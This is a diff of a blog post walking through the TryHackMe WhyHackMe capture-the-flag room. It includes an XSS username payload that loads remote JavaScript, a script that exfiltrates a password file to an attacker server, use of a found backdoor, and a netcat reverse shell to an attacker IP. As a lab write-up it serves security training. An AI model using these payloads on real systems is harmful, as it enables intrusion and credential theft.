@@ -11,13 +11,17 @@ image:
   path: /assets/img/2025-07-10-TryHackMe-WhyHackMe/main.webp
 ---
 
-Hi I'm making [TryHackMe WhyHackMe](https://tryhackme.com/room/whyhackme) room.
+Hey everyone, and welcome to another CTF adventure! Today, we're diving into the [TryHackMe WhyHackMe](https://tryhackme.com/room/whyhackme) room. This was a really fun box with a few twists and turns. So grab your coffee, fire up your terminal, and let's get hacking!
 
----
+### Step 1: Reconnaissance - The Digital Knock on the Door
+
+First things first, let's set our target IP address as a variable. This saves us from a world of copy-pasting pain later on. Trust me, your fingers will thank you.
 
 ```bash
-IP=10.10.157.184
+export IP=10.10.157.184
 ```
+
+With our target locked in, it's time to unleash the beast: `nmap`. We'll do a full port scan to see what services are welcoming us.
 
 ```bash
 ❯ nmap -T4 -n -sC -sV -Pn -p- $IP
@@ -57,19 +61,18 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 65.77 seconds
 ```
 
-Lets firstly go to the website.
+Let's start with the web server on port 80.
 
 ![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo1.webp){: width="972" height="589" }
 
-Looks like very simple php website.
-
-Looking throught website I found some login endpotint `/login.php`
+It looks like a simple PHP website. After clicking around a bit, I stumbled upon a login page at `/login.php`.
 
 ![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo2.webp){: width="972" height="589" }
 
-admin admin didn't worked lets firstly fuzz the website using `gobuster`.
+My usual go-to combo of `admin:admin` didn't work (shocker!). Before we get too crazy, let's do some directory fuzzing with `gobuster` to see if there are any hidden pages.
 
 ```bash
+# Time to bust some directories and files wide open!
 ❯ gobuster dir -w common.txt -u http://$IP/ -x md,js,html,php,py,css,txt,bak -t 50
 ===============================================================
 Gobuster v3.7
@@ -102,17 +105,15 @@ Finished
 ===============================================================
 ```
 
-And I found register.php so lets register a account first and try to log in.
+Jackpot! Gobuster found `/register.php`. If we can't log in, we'll just make our own account!
 
 ![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo3.webp){: width="972" height="589" }
 
-I logged in but thats it i think.
+After registering and logging in, we're told we can now comment on posts. This is a classic place to hunt for Cross-Site Scripting (XSS) vulnerabilities.
 
-It says that now we can comment on posts.
+### Step 2: Initial Foothold - XSS for the Win!
 
-Maybe we can try to exploit that.
-
-Firstly lets log in Anonymous on ftp.
+Before we go down the XSS rabbit hole, let's circle back to that anonymous FTP server. What was in that `update.txt` file?
 
 ```bash
 root@e3769c930fc5:/data# ftp 10.10.157.184 21
@@ -138,7 +139,7 @@ drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
 226 Directory send OK.
 ```
 
-Lets download update.txt
+Let's grab that file and see what's inside.
 
 ```bash
 ftp> get update.txt
@@ -150,29 +151,31 @@ Hey I just removed the old user mike because that account was compromised and fo
 - admin
 ```
 
-Now lets continue trying to xss vuln.
+Aha! This is a massive clue. There's a password file at `/dir/pass.txt`, but it's only accessible from `localhost`. This means we need to make the server itself request that file for us. An XSS attack is the perfect tool for this job!
+
+Let's test the comment section for XSS. A simple `<script>alert("Test")</script>` comment doesn't work.
 
 ![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo4.webp){: width="972" height="589" }
 
-It looks like this is not working lets try creating a user named xss vuln.
-
-And It works.
+But what if the vulnerability is in the username field? I created a new user with the name `<script>alert("Test")</script>`, and... success! The username is reflected on the page without being sanitized.
 
 ![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo5.webp){: width="972" height="589" }
 
-Now lets use this vuln to get the /dir/pass.txt
+Now we can weaponize this. The plan is:
+1.  Craft a JavaScript payload that fetches `/dir/pass.txt`.
+2.  Host this payload on our attacker machine.
+3.  Create a new user with a username that loads our remote JavaScript file.
+4.  When the admin views the comments, their browser will execute our script, fetch the password, and send it back to us!
 
-Now firstly open a username named
+I'll register a new user with the username:
+`<script src="http://<YOUR_ATTACKER_IP>/pwn.js"></script>`
 
-`<script src="http://10.21.206.128/pwn.js"></script>`
-
-Here is the code I used:
-
-[TrustedSec | Simple Data Exfiltration Through XSS](https://trustedsec.com/blog/simple-data-exfiltration-through-xss)
+Here is the `pwn.js` payload I used, adapted from a great article by [TrustedSec](https://trustedsec.com/blog/simple-data-exfiltration-through-xss). This script fetches the content of `/dir/pass.txt`, Base64-encodes it, and sends it to our listening web server disguised as an image request. Sneaky!
 
 ```javascript
-// TrustedSec Proof-of-Concept to steal
-// sensitive data through XSS payload
+// A nifty script to exfiltrate data via XSS
+// Based on a PoC from TrustedSec
+
 function read_body(xhr) {
   var data;
   if (!xhr.responseType || xhr.responseType === "text") {
@@ -246,13 +249,14 @@ function stealData() {
 stealData();
 ```
 
-Now serve this code using a webserver.
+Now, let's serve this file with a simple Python web server.
 
 ```bash
+# Firing up a web server on port 80 to serve our evil script
 ❯ sudo python -m http.server 80
 ```
-And you'll get the password base64 encoded after sending a new comment.
 
+After creating the user, I posted a new comment to trigger the admin to view the page. A few moments later, we get a hit on our server!
 
 ```text
 10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /pwn.js HTTP/1.1" 200 -
@@ -260,46 +264,24 @@ And you'll get the password base64 encoded after sending a new comment.
 10.10.157.184 - - [10/Jul/2025 15:30:03] "GET /exfil/LAST/**************GFzc3dvcmRTb1N0cm9uZ0lESwo=.jpg HTTP/1.1" 404 -
 ```
 
-decode the base64 and you'll get the jacks password
+Look at that! We have the Base64-encoded password. Let's decode it:
+`echo "*********************" | base64 -d`
+This gives us `jack:***************`.
 
-use that password to log in with ssh as jack.
+Now we have credentials! Let's SSH in as `jack`.
+
 ```bash
-❯ ssh jack@$IP                 
+❯ ssh jack@$IP
 The authenticity of host '10.10.157.184 (10.10.157.184)' can't be established.
 ED25519 key fingerprint is SHA256:4vHbB54RGaVtO3RXlzRq50QWtP3O7aQcnFQiVMyKot0.
 This key is not known by any other names.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.157.184' (ED25519) to the list of known hosts.
 jack@10.10.157.184's password: 
-Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-159-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Thu 10 Jul 2025 12:33:12 PM UTC
-
-  System load:  0.0                Processes:             130
-  Usage of /:   79.7% of 11.21GB   Users logged in:       0
-  Memory usage: 32%                IPv4 address for eth0: 10.10.157.184
-  Swap usage:   0%
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-64 updates can be applied immediately.
-To see these additional updates run: apt list --upgradable
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Mon Jan 29 13:44:19 2024
 jack@ubuntu:~$ 
 ```
 
+We're in! Let's grab that user flag.
 
 ```bash
 jack@ubuntu:~$ ls
@@ -307,6 +289,12 @@ user.txt
 jack@ubuntu:~$ cat user.txt 
 *******************************
 ```
+
+User flag secured. Now for the final boss: root.
+
+### Step 3: Privilege Escalation - The Path to Root
+
+Let's start our internal enumeration. What services are running?
 
 ```bash
 jack@ubuntu:/home$ service --status-all
@@ -348,18 +336,16 @@ jack@ubuntu:/home$ service --status-all
  [ - ]  x11-common
 ```
 
-lets log in mysql service.
-
-
-runnning linpeas I found this.
-
+While poking around (or running a script like LinPEAS), I found a password in `/var/www/html/config.php`.
 
 ```text
 /var/www/html/config.php:$password = "MysqlPasswordIsPrettyStrong";
 ```
 
+This looks like a database password. Let's try to log in to MySQL as root with it.
 
 ```bash
+# Trying the MySQL password we found
 jack@ubuntu:/home$ mysql -u root -p
 Enter password: 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -373,9 +359,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 MariaDB [(none)]> 
 ```
 
-
-I searched the database little bit but found nothing good.
-
+It works! However, after a bit of digging, the database turned out to be a dead end. Let's see what `sudo` rights `jack` has.
 
 ```bash
 jack@ubuntu:~$ sudo -l
@@ -388,6 +372,9 @@ User jack may run the following commands on ubuntu:
     (ALL : ALL) /usr/sbin/iptables
 ```
 
+We can run `iptables` as any user! This is huge. It connects directly to our filtered port `41312` from the Nmap scan.
+
+Let's check the `/opt` directory, which often contains non-standard files.
 
 ```bash
 jack@ubuntu:/opt$ ls -la
@@ -400,12 +387,12 @@ jack@ubuntu:/opt$ cat urgent.txt
 Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
 ```
 
-Found these too.
+This note confirms everything. There's a backdoor in `/usr/lib/cgi-bin/`, and it's being blocked by `iptables`. We have the power to unblock it!
 
-We can use this backdoor to gain root.
-
+Let's look at the current `iptables` rules.
 
 ```bash
+# Checking the firewall rules
 jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -L --line-numbers
 Chain INPUT (policy ACCEPT)
 num  target     prot opt source               destination         
@@ -424,9 +411,17 @@ num  target     prot opt source               destination
 Chain OUTPUT (policy ACCEPT)
 num  target     prot opt source               destination         
 1    ACCEPT     all  --  anywhere             anywhere            
+```
+
+Rule #1 is dropping all traffic to port 41312. Let's replace that rule with one that accepts the traffic instead.
+
+```bash
+# Trying to access the port before changing the rule (it will hang)
 jack@ubuntu:/tmp$ curl localhost:41312
 ^C
+# Let's replace the DROP rule with an ACCEPT rule
 jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT
+# Confirming our change
 jack@ubuntu:/tmp$ sudo /usr/sbin/iptables -L --line-numbers
 Chain INPUT (policy ACCEPT)
 num  target     prot opt source               destination         
@@ -445,6 +440,7 @@ num  target     prot opt source               destination
 Chain OUTPUT (policy ACCEPT)
 num  target     prot opt source               destination         
 1    ACCEPT     all  --  anywhere             anywhere            
+# Now let's try to access it again
 jack@ubuntu:/tmp$ curl localhost:41312
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -460,10 +456,10 @@ Reason: You're speaking plain HTTP to an SSL-enabled server port.<br />
 </body></html>
 ```
 
-
-Lets try that
+The port is open, but it's expecting an SSL/TLS connection (HTTPS). Let's try connecting from our machine with `curl`.
 
 ```bash
+# Trying to access the backdoor with HTTPS
 ❯ curl -k https://$IP:41312/
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -476,10 +472,11 @@ Lets try that
 </body></html>
 ```
 
-
+We get a `403 Forbidden`. This means we're hitting the server, but we don't know the correct path to the backdoor script. This is where the `capture.pcap` file comes in. We need to download it and analyze it. Since it's encrypted traffic, we also need the server's private key to decrypt it. A good place to look for that is in the Apache configuration directories.
 
 ```bash
-❯ sftp jack@$IP                
+# Using SFTP to download the pcap file
+❯ sftp jack@$IP
 jack@10.10.157.184's password: 
 Connected to 10.10.157.184.
 sftp> ls
@@ -492,12 +489,10 @@ Fetching /opt/capture.pcap to capture.pcap
 capture.pcap                                     
 ```
 
-
-I used wireshark to see the traffic but it's encypted lets get the encyption keys.
-
-
+Now, let's grab the key.
 
 ```bash
+# Using SFTP to grab the Apache private key
 ❯ sftp jack@$IP
 jack@10.10.157.184's password: 
 Connected to 10.10.157.184.
@@ -509,44 +504,40 @@ Fetching /etc/apache2/certs/apache.key to apache.key
 apache.key                              
 ```
 
-
-Using wireshark I decrpyted the pcap file and get the cgi-bin endpoint we can use.
-
-
+With `capture.pcap` and `apache.key`, we can open the capture in Wireshark. In Wireshark, go to `Edit -> Preferences -> Protocols -> TLS` and add the `apache.key` file to the "RSA keys list". After doing this, the traffic magically decrypts, and we can see the full request to the backdoor!
 
 ![Desktop View](/assets/img/2025-07-10-TryHackMe-WhyHackMe/photo6.webp){: width="972" height="589" }
 
+The decrypted packet reveals the path: `/cgi-bin/5UP3r53Cr37.py` and the required GET parameters: `key` and `iv`, plus a `cmd` parameter for our command. Let's test it with `cmd=id`.
 
 ```bash
+# Executing 'id' via the secret backdoor
 ❯ curl -k -s 'https://10.10.157.184:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id'
 
 <h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
 <h2>
 ```
 
-Lets get a simple reverse shell first.
-
-
-I get my shell from [Online - Reverse Shell Generator](https://www.revshells.com/)
-
+It works! We have command execution as `www-data`. Now, for the final blow: a reverse shell. I'll grab a reverse shell from [revshells.com](https://www.revshells.com/) and URL-encode it.
 
 ```bash
+# Catching a shell as www-data. Don't forget to start a netcat listener! nc -lvnp 4444
 ❯ curl -k -s 'https://10.10.157.184:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.206.128%204444%20%3E%2Ftmp%2Ff'
 ```
 
-
-
-Lets quickly upgrade the shell
-
-
+We get a shell! Let's quickly upgrade it to a fully interactive TTY for a better experience.
 
 ```bash
+# Upgrade to a fully functional shell
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 export TERM=xterm-256color
-# 
+# Press CTRL+Z to background the shell
 stty raw -echo;fg
+# Press Enter twice
 reset
 ```
+
+Now, let's check our `sudo` privileges as `www-data`.
 
 ```bash
 www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
@@ -558,20 +549,17 @@ User www-data may run the following commands on ubuntu:
     (ALL : ALL) NOPASSWD: ALL
 ```
 
-And we got root.
-
-
+And there it is. The holy grail of privesc: `(ALL : ALL) NOPASSWD: ALL`. We can run any command as any user, without a password. Game over.
 
 ```bash
 www-data@ubuntu:/usr/lib/cgi-bin$ sudo bash
-root@ubuntu:/usr/lib/cgi-bin# ls
-5UP3r53Cr37.py
-root@ubuntu:/usr/lib/cgi-bin# cd
+root@ubuntu:/usr/lib/cgi-bin# whoami
+root
+root@ubuntu:/usr/lib/cgi-bin# cd /root
 root@ubuntu:~# ls
 bot.py  root.txt  snap  ssh.sh
 root@ubuntu:~# cat root.txt 
 *******************************
 ```
 
-
-Thanks
+And we are root! Thanks for following along. This was a fantastic room that covered a wide range of skills. Happy hacking!
